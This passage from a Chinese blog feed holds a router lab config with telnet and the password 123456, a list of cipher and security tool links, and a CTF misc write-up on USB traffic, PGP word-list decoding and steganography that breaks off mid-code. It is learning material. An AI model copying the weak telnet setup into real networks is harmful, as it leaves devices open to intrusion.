class="line">rule permit source 192.168.0.0 0.0.255.255</span><br><span class="line">q</span><br><span class="line">int g0/0/0</span><br><span class="line">nat outbound 2000</span><br><span class="line">super password cipher 123456</span><br><span class="line">user-int vty 0 4</span><br><span class="line">authentication-mode pass 123456</span><br><span class="line">protocol inbound telnet</span><br><span class="line">user privilege level 10</span><br><span class="line">int g0/0/0</span><br><span class="line">nat se p tcp gl 202.106.1.3 tel inside 192.168.13.2 23</span><br></pre></td></tr></table></figure><hr><h3 id="AR2"><a href="#AR2" class="headerlink" title="AR2"></a>AR2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sys 2136</span><br><span class="line">int g0/0/0</span><br><span class="line">ip add 202.106.1.1 29</span><br><span class="line">int g0/0/1</span><br><span class="line">ip add 202.106.0.1 24</span><br><span class="line">int g0/0/2</span><br><span class="line">ip add 202.106.2.1 29</span><br><span class="line">q</span><br><span class="line">ip route-s 0.0.0.0 0 202.106.1.2</span><br><span class="line">super password cipher 123456</span><br><span class="line">user-int vty 0 4</span><br><span class="line">authentication-mode pass 123456</span><br><span class="line">protocol inbound telnet</span><br><span class="line">user privilege level 10</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>河北</p><figure class="image-box">                <img src="./河北.png" alt="图片" title class>                <p>图片</p>            </figure><p>天津</p><figure class="image-box">                <img src="./天津.png" alt="图片" title class>                <p>图片</p>            </figure><p>Telnet</p><figure class="image-box">                <img src="./telnet.jpg" alt="图片" title class>                <p>图片</p>            </figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;考试要求&quot;&gt;&lt;a href=&quot;#考试要求&quot; class=&quot;headerlink&quot; title=&quot;考试要求&quot;&gt;&lt;/a&gt;考试要求&lt;/h2&gt;&lt;figure class=&quot;image-box&quot;&gt;
                &lt;img src=&quot;./考试要求.png&quot; 
      
    
    </summary>
    
    
      <category term="日常" scheme="https://www.damyahome.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
      <category term="网络工程" scheme="https://www.damyahome.github.io/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>一些我常用的在线网站(持续更新)</title>
    <link href="https://www.damyahome.github.io/%E5%B7%A5%E5%85%B7/ckwd913e9005lpwucl9e5worh/%E4%B8%80%E4%BA%9B%E6%88%91%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
    <id>https://www.damyahome.github.io/%E5%B7%A5%E5%85%B7/ckwd913e9005lpwucl9e5worh/%E4%B8%80%E4%BA%9B%E6%88%91%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</id>
    <published>2020-10-13T12:28:23.000Z</published>
    <updated>2020-10-28T13:26:13.828Z</updated>
    
    <content type="html"><![CDATA[<h2 id="工具箱"><a href="#工具箱" class="headerlink" title="工具箱"></a>工具箱</h2><p><a href="http://www.atoolbox.net/" target="_blank" rel="noopener">一个工具箱</a></p><p><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">CyberChef密码工具</a></p><p><a href="https://cn.dll-files.com/search.dll.html" target="_blank" rel="noopener">dll缺失</a></p><h2 id="日常类"><a href="#日常类" class="headerlink" title="日常类"></a>日常类</h2><p><a href="http://tools.jb51.net/aideddesign/ip_net_calc" target="_blank" rel="noopener">IP地址/子网掩码计算与转换</a></p><p><a href="http://tools.jb51.net/aideddesign/ico_img" target="_blank" rel="noopener">ico图标生成</a></p><p><a href="http://tools.jb51.net/aideddesign/txt_quchong" target="_blank" rel="noopener">文本去重复</a></p><p><a href="http://tools.jb51.net/aideddesign/txt_diff#diff" target="_blank" rel="noopener">文本内容比较</a></p><p><a href="http://tools.jb51.net/transcoding/jb51qrcode" target="_blank" rel="noopener">二维码加强生成</a></p><p><a href="http://www.uuid.online/" target="_blank" rel="noopener">UUID在线生成</a></p><p><a href="http://tools.jb51.net/aideddesign/rnd_userinfo" target="_blank" rel="noopener">虚假个人信息生成</a></p><p><a href="http://tools.jb51.net/aideddesign/paixu_ys" target="_blank" rel="noopener">在线动画演示插入/选择/冒泡/归并/希尔/快速排序算法过程</a></p><p><a href="http://tools.jb51.net/table/useragent" target="_blank" rel="noopener">常用pc/移动端UA信息</a></p><p><a href="http://tools.jb51.net/table/tcp_udp_port" target="_blank" rel="noopener">常见TCP/UDP端口参考表</a></p><p><a href="http://tools.jb51.net/table/http_content_type" target="_blank" rel="noopener">HTTP Content-type对照表</a></p><p><a href="http://tools.jb51.net/table/http_status_code" target="_blank" rel="noopener">HTTP 状态码对照表</a></p><p><a href="http://tools.jb51.net/table/http_header" target="_blank" rel="noopener">HTTP 请求头对照表</a></p><p><a href="https://www.gaitubao.com/" target="_blank" rel="noopener">在线修改图片尺寸大小</a></p><p><a href="http://www.txttool.com/wenben_binarystr.asp" target="_blank" rel="noopener">全面增删改文本工具</a></p><p><a href="https://1024tools.com/unserialize" target="_blank" rel="noopener">php在线反序列化工具</a></p><p><a href="https://www.gugeapps.net/" target="_blank" rel="noopener">谷歌网上应用店镜像站</a></p><p><a href="https://apps.timwhitlock.info/emoji/tables/unicode" target="_blank" rel="noopener">emoji编码表</a></p><p><a href="https://matrix.reshish.com/zh/multCalculation.php" target="_blank" rel="noopener">线代计算网站</a></p><p><a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">Unicode大全</a></p><p><a href="https://www.dooccn.com/php/" target="_blank" rel="noopener">PHP等代码在线运行</a></p><h2 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h2><p><a href="http://qtool.net/baseencode" target="_blank" rel="noopener">base16/32/36/58/62/64/85/91</a></p><p><a href="http://tool.chinaz.com/tools/imgtobase/" target="_blank" rel="noopener">base64图片编码解码</a>data:image/jpg;base64,</p><p><a href="https://www.somd5.com/" target="_blank" rel="noopener">SOMD5</a></p><p><a href="https://www.cmd5.com/" target="_blank" rel="noopener">CMD5</a></p><p><a href="http://www.chamd5.org/" target="_blank" rel="noopener">查MD5</a></p><p><a href="http://tools.jb51.net/aideddesign/flipped_txt" target="_blank" rel="noopener">文本上下翻转</a></p><p><a href="https://sekao.net/pixeljihad/" target="_blank" rel="noopener">PixelJihad图片隐写</a></p><p><a href="https://www.sojson.com/jsjiemi.html" target="_blank" rel="noopener">JS加密/解密/混淆/aa/jj/fuck等</a></p><p><a href="https://www.atool99.com/morse.php" target="_blank" rel="noopener">中英文morse电码加解密</a></p><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">Brainfuck/Ook</a></p><p><a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">morse电码自适应音频解码器</a></p><p><a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">Vigenere/Autokey/Beaufort/substitution密码</a></p><p><a href="https://www.cs.drexel.edu/~jpopyack/IntroCS/HW/RSAWorksheet.html" target="_blank" rel="noopener">RSA计算器</a></p><p><a href="https://codewithrockstar.com/docs" target="_blank" rel="noopener">rockstar密码</a></p><p><a href="https://www.ssleye.com/ser_cipher.html" target="_blank" rel="noopener">Serpent密码加密解密</a></p><p><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">栅栏密码</a></p><p><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php" target="_blank" rel="noopener">凯撒密码</a></p><p><a href="http://www.bertnase.de/npiet/npiet-execute.php" target="_blank" rel="noopener">npiet加密解密</a></p><p><a href="http://factordb.com/" target="_blank" rel="noopener">RSA分解N</a></p><p><a href="https://www.ctftools.com/down/down/passwd/" target="_blank" rel="noopener">摩斯、凯撒、中文凯撒、栅栏、维吉尼亚、替代、置换、MD5加密等</a></p><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a></p><p><a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">新与佛论禅</a></p><p><a href="https://jwt.io/" target="_blank" rel="noopener">JWT签名检验</a></p><p><a href="https://goto.pachanka.org/crypto/pgp-wordlist" target="_blank" rel="noopener">PGP密码解密</a></p><p><a href="https://yuanfux.github.io/zero-width-web/" target="_blank" rel="noopener">零宽字节隐写</a></p><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">自动替换密码求解器</a></p><p><a href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="noopener">ROT5/13/18/47编码转换</a></p><p><a href="http://www.atoolbox.net/Tool.php?Id=937" target="_blank" rel="noopener">emoji表情编码解码</a></p><p><a href="http://www.atoolbox.net/Tool.php?Id=850" target="_blank" rel="noopener">社会主义核心价值观加密解密</a></p><p><a href="http://114.xixik.com/tiangandizhi/" target="_blank" rel="noopener">天干地支甲子对照表</a></p><p><a href="https://www.dcode.fr/dancing-men-cipher" target="_blank" rel="noopener">跳舞的男人密码</a></p><p><a href="https://apps.timwhitlock.info/unicode/inspect" target="_blank" rel="noopener">emoji编码加解密</a></p><p><a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">维吉尼亚自动求解</a></p><p><a href="http://www.metools.info/code/c90.html" target="_blank" rel="noopener">猪圈密码在线解密</a></p><p><a href="http://www.metools.info/code/railfencecipher_154.html" target="_blank" rel="noopener">w型栅栏密码</a></p><h2 id="看技术文章"><a href="#看技术文章" class="headerlink" title="看技术文章"></a>看技术文章</h2><p><a href="https://cxsecurity.com/exploit/" target="_blank" rel="noopener">https://cxsecurity.com/exploit/</a></p><p><a href="http://www.hackdig.com/?tag=CTF" target="_blank" rel="noopener">http://www.hackdig.com/?tag=CTF</a></p><p><a href="https://www.xj.hk/" target="_blank" rel="noopener">https://www.xj.hk/</a></p><p><a href="https://paper.seebug.org/" target="_blank" rel="noopener">https://paper.seebug.org/</a></p><p><a href="http://toutiao.secjia.com/#/" target="_blank" rel="noopener">http://toutiao.secjia.com/#/</a></p><p><a href="https://www.yuque.com/jxswcy/ctfnotebook" target="_blank" rel="noopener">https://www.yuque.com/jxswcy/ctfnotebook</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;工具箱&quot;&gt;&lt;a href=&quot;#工具箱&quot; class=&quot;headerlink&quot; title=&quot;工具箱&quot;&gt;&lt;/a&gt;工具箱&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://www.atoolbox.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;
      
    
    </summary>
    
    
      <category term="工具" scheme="https://www.damyahome.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="收集" scheme="https://www.damyahome.github.io/tags/%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>2020西湖论剑misc复现</title>
    <link href="https://www.damyahome.github.io/ctf-writeup-misc/ckwd913as0011pwucbuu0sam2/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91misc%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.damyahome.github.io/ctf-writeup-misc/ckwd913as0011pwucbuu0sam2/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91misc%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-10-12T13:30:01.000Z</published>
    <updated>2020-10-12T13:47:18.836Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做的时候就觉得题目阴间得一匹,没想到官方wp也这么阴间,原理呢?分析呢?不管怎么说看着就是不明不白脑洞也贼多,复现起来也怪怪的</p><h2 id="yusa-yyds"><a href="#yusa-yyds" class="headerlink" title="yusa_yyds"></a>yusa_yyds</h2><p>回过头仔细看时才注意到Xbox360提示,当时其实队友有注意到可能是xbox,我们还看了<a href="https://www.partsnotincluded.com/understanding-the-xbox-360-wired-controllers-usb-data/" target="_blank" rel="noopener">官方文档</a>,但想多了,注意力全放在提取出来的usbdata上,最后也没看懂</p><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure><p>xbox传入的信息在流量包的DEVICE DESCRIPTOR部分,以下截一个包分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DEVICE DESCRIPTOR</span><br><span class="line">    bLength: 18</span><br><span class="line">    bDescriptorType: 0x01 (DEVICE)</span><br><span class="line">//设备描述符长度为18个字节</span><br><span class="line">    bcdUSB: 0x0200</span><br><span class="line">//控制器使用USB2.0</span><br><span class="line">    bDeviceClass: Vendor Specific (0xff)</span><br><span class="line">    bDeviceSubClass: 255</span><br><span class="line">    bDeviceProtocol: 255</span><br><span class="line">//设备的USB设备类别被设定为0xFF，子类设定为255,设备协议设定为255</span><br><span class="line">    bMaxPacketSize0: 8</span><br><span class="line">//端点0（设备控制端点）的最大数据包大小为8字节</span><br><span class="line">    idVendor: Microsoft Corp. (0x045e)</span><br><span class="line">    idProduct: Xbox360 Controller (0x028e)</span><br><span class="line">//供应商VID和PID信息信息</span><br><span class="line">    bcdDevice: 0x0114</span><br><span class="line">//供应商定义的版本号,被编码为二进制编码的十进制,使用8421编码可转为1.1.4版本</span><br><span class="line">    iManufacturer: 1</span><br><span class="line">    iProduct: 2</span><br><span class="line">    iSerialNumber: 3</span><br><span class="line">    bNumConfigurations: 1</span><br><span class="line">//描述制造商,产品,序列号的字符串在索引1,2,3,该设备只有1种配置</span><br></pre></td></tr></table></figure><p>通过time可以发现,中间断电缺失了一段时间的数据<br><figure class="image-box">                <img src="./2.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>然后wp里说的</p><figure class="image-box">                <img src="./3.png" alt="图片" title class>                <p>图片</p>            </figure><p>恕我直言没看懂,希望能有师傅教教我</p><p>下面是之前常规做法时提取的usbdata</p><p>提取usb流量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r game.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure><p>读取出来的usb流量,不是常规的键盘和鼠标敲击码<br>键盘一般是八位一组,第一二位都是00,第三位开始记录击键信息.</p><p>鼠标一般是四位一组,第一位代表按键,取00时没有按键,取01时按左键,取02时按右键;第二位可以看成是一个signed byte类型,最高位为符号位,当这个值为正时代表鼠标水平右移多少像素,为负时代表水平左移多少像素.第三位与第二位类似,代表垂直上下移动的偏移.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">01:00:00:00:65:00:00:00:00:00:00:53:00:00:00:00:00:00:00:00:00:00:05:04:00:00:00:00:00:00:00:45:00:00:05:00:00:00:04:00:02:0b:b8:05:00:00:00:04:00:02:0b:b9:02:00:00:00:04:00:00:00:01:06:00:00:00:08:00:00:00:05:25:03:78:ce:05:00:00:00:04:00:02:0b:b9:02:00:00:00:04:00:00:00:02:01:00:00:00:04:00:00:00:01</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">01:00:00:00:65:00:00:00:00:00:00:53:00:00:00:00:00:00:00:00:00:00:05:04:00:00:00:00:00:00:00:45:00:00:05:00:00:00:04:00:02:0b:b8:05:00:00:00:04:00:02:0b:b9:02:00:00:00:04:00:00:00:01:06:00:00:00:08:00:00:00:05:25:90:30:ce:05:00:00:00:04:00:02:0b:b9:02:00:00:00:04:00:00:00:02:01:00:00:00:04:00:00:00:02</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br></pre></td></tr></table></figure><h2 id="yusapapa"><a href="#yusapapa" class="headerlink" title="yusapapa"></a>yusapapa</h2><p>在网页注释里有提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Maybe these texts are really helpful for you</span><br><span class="line">Biometric list is OK!</span><br><span class="line">endow gremlin indulge bison flatfoot fallout goldfish bison hockey fracture fracture bison goggles jawbone bison flatfoot gremlin glucose glucose fracture flatfoot indoors gazelle gremlin goldfish bison guidance indulge keyboard keyboard glucose fracture hockey bison gazelle goldfish bison cement frighten gazelle goldfish indoors buzzard highchair fallout highchair bison fallout goldfish flytrap bison fallout goldfish gremlin indoors frighten fracture highchair bison cement fracture goldfish flatfoot gremlin flytrap fracture buzzard guidance goldfish freedom buzzard allow crowfoot jawbone bison indoors frighten fracture bison involve fallout jawbone Burbank indoors frighten fracture bison guidance gazelle flatfoot indoors indulge highchair fracture bison hockey frighten gremlin indulge flytrap bison flagpole fracture bison indulge hockey fracture flytrap bison allow blockade endow indulge hockey fallout blockade bison gazelle hockey bison inverse fracture highchair jawbone bison gazelle goggles guidance gremlin highchair indoors fallout goldfish indoors bison gazelle goldfish bison indoors frighten gazelle hockey bison flatfoot frighten fallout glucose glucose fracture goldfish freedom fracture blackjack blackjack</span><br></pre></td></tr></table></figure><p>去重整理列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">endow</span><br><span class="line">gremlin</span><br><span class="line">indulge</span><br><span class="line">bison</span><br><span class="line">flatfoot</span><br><span class="line">fallout</span><br><span class="line">goldfish</span><br><span class="line">hockey</span><br><span class="line">fracture</span><br><span class="line">goggles</span><br><span class="line">jawbone</span><br><span class="line">glucose</span><br><span class="line">indoors</span><br><span class="line">gazelle</span><br><span class="line">guidance</span><br><span class="line">keyboard</span><br><span class="line">cement</span><br><span class="line">frighten</span><br><span class="line">buzzard</span><br><span class="line">highchair</span><br><span class="line">flytrap</span><br><span class="line">freedom</span><br><span class="line">allow</span><br><span class="line">crowfoot</span><br><span class="line">involve</span><br><span class="line">Burbank</span><br><span class="line">flagpole</span><br><span class="line">blockade</span><br><span class="line">inverse</span><br><span class="line">blackjack</span><br></pre></td></tr></table></figure></p><p>根据PGP词汇表对应写个脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line">a = <span class="string">"endow gremlin indulge bison flatfoot fallout goldfish bison hockey fracture fracture bison goggles jawbone bison flatfoot gremlin glucose glucose fracture flatfoot indoors gazelle gremlin goldfish bison guidance indulge keyboard keyboard glucose fracture hockey bison gazelle goldfish bison cement frighten gazelle goldfish indoors buzzard highchair fallout highchair bison fallout goldfish flytrap bison fallout goldfish gremlin indoors frighten fracture highchair bison cement fracture goldfish flatfoot gremlin flytrap fracture buzzard guidance goldfish freedom buzzard allow crowfoot jawbone bison indoors frighten fracture bison involve fallout jawbone Burbank indoors frighten fracture bison guidance gazelle flatfoot indoors indulge highchair fracture bison hockey frighten gremlin indulge flytrap bison flagpole fracture bison indulge hockey fracture flytrap bison allow blockade endow indulge hockey fallout blockade bison gazelle hockey bison inverse fracture highchair jawbone bison gazelle goggles guidance gremlin highchair indoors fallout goldfish indoors bison gazelle goldfish bison indoors frighten gazelle hockey bison flatfoot frighten fallout glucose glucose fracture goldfish freedom fracture blackjack blackjack"</span></span><br><span class="line">s = a.split(<span class="string">" "</span>)</span><br><span class="line">dict = &#123;<span class="string">'endow'</span>: <span class="string">'59'</span>,</span><br><span class="line"><span class="string">'gremlin'</span>: <span class="string">'6F'</span>,</span><br><span class="line"><span class="string">'indulge'</span>: <span class="string">'75'</span>,</span><br><span class="line"><span class="string">'bison'</span>:<span class="string">'20'</span>,</span><br><span class="line"><span class="string">'flatfoot'</span>:<span class="string">'63'</span>,</span><br><span class="line"><span class="string">'fallout'</span>:<span class="string">'61'</span>,</span><br><span class="line"><span class="string">'goldfish'</span>: <span class="string">'6E'</span>,</span><br><span class="line"><span class="string">'hockey'</span>: <span class="string">'73'</span>,</span><br><span class="line"><span class="string">'fracture'</span>: <span class="string">'65'</span>,</span><br><span class="line"><span class="string">'goggles'</span>:<span class="string">'6D'</span>,</span><br><span class="line"><span class="string">'jawbone'</span>: <span class="string">'79'</span>,</span><br><span class="line"><span class="string">'glucose'</span>: <span class="string">'6C'</span>,</span><br><span class="line"><span class="string">'indoors'</span>: <span class="string">'74'</span>,</span><br><span class="line"><span class="string">'gazelle'</span>: <span class="string">'69'</span>,</span><br><span class="line"><span class="string">'guidance'</span>: <span class="string">'70'</span>,</span><br><span class="line"><span class="string">'keyboard'</span>: <span class="string">'7A'</span>,</span><br><span class="line"><span class="string">'cement'</span>: <span class="string">'2F'</span>,</span><br><span class="line"><span class="string">'frighten'</span>: <span class="string">'68'</span>,</span><br><span class="line"><span class="string">'buzzard'</span>: <span class="string">'2E'</span>,</span><br><span class="line"><span class="string">'highchair'</span>: <span class="string">'72'</span>,</span><br><span class="line"><span class="string">'flytrap'</span>: <span class="string">'64'</span>,</span><br><span class="line"><span class="string">'freedom'</span>: <span class="string">'67'</span>,</span><br><span class="line"><span class="string">'allow'</span>: <span class="string">'0A'</span>,</span><br><span class="line"><span class="string">'crowfoot'</span>: <span class="string">'42'</span>,</span><br><span class="line"><span class="string">'involve'</span>: <span class="string">'77'</span>,</span><br><span class="line"><span class="string">'Burbank'</span>: <span class="string">'2C'</span>,</span><br><span class="line"><span class="string">'flagpole'</span>: <span class="string">'62'</span>,</span><br><span class="line"><span class="string">'blockade'</span>: <span class="string">'22'</span>,</span><br><span class="line"><span class="string">'inverse'</span>: <span class="string">'76'</span>,</span><br><span class="line"><span class="string">'blackjack'</span>: <span class="string">'21'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">print</span> (dict[item],end=<span class="string">''</span>)</span><br><span class="line"><span class="number">596</span>F752063616E20736565206D7920636F6C6C656374696F6E2070757A7A6C657320696E202F68696E742E72617220616E6420616E6F74686572202F656E636F64652E706E672E0A427920746865207761792C74686520706963747572652073686F75642062652075736564200A225975736122206973207665727920696D706F7274616E7420696E2074686973206368616C6C656E67652121</span><br></pre></td></tr></table></figure></p><p>解hex<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can see my collection puzzles in /hint.rar and another /encode.png.</span><br><span class="line">By the way,the picture shoud be used</span><br><span class="line">&quot;Yusa&quot; is very important in this challenge!!</span><br></pre></td></tr></table></figure></p><p>也可以在<a href="https://goto.pachanka.org/crypto/pgp-wordlist" target="_blank" rel="noopener">在线网站解密</a><br>同时发现页面的图片是.webp格式,存在webp隐写</p><p>stegpy工具安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install stegpy</span><br><span class="line">git clone https://github.com/dhsdshdhk/stegpy.git</span><br><span class="line">cd stegpy</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><p>使用命令行解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stegpy encode.webp</span><br><span class="line">得到密码</span><br><span class="line">the_key_is:Yus@_yydsstegpy!!</span><br></pre></td></tr></table></figure></p><p>下载hint.rar后,注释里提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用一种较为古老和不常见的工具。USE your google and Baidu</span><br></pre></td></tr></table></figure></p><p>使用刚才用stegpy解出来的密码解压缩,得到一张图片<br><figure class="image-box">                <img src="./4.jpg" alt="图片" title class>                <p>图片</p>            </figure></p><p>根据比赛放出的提示搜到 invisible Secrets 工具,我下的是pro 3.0 版本</p><p>使用工具解密文件,密码是Yusa,得到encode.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 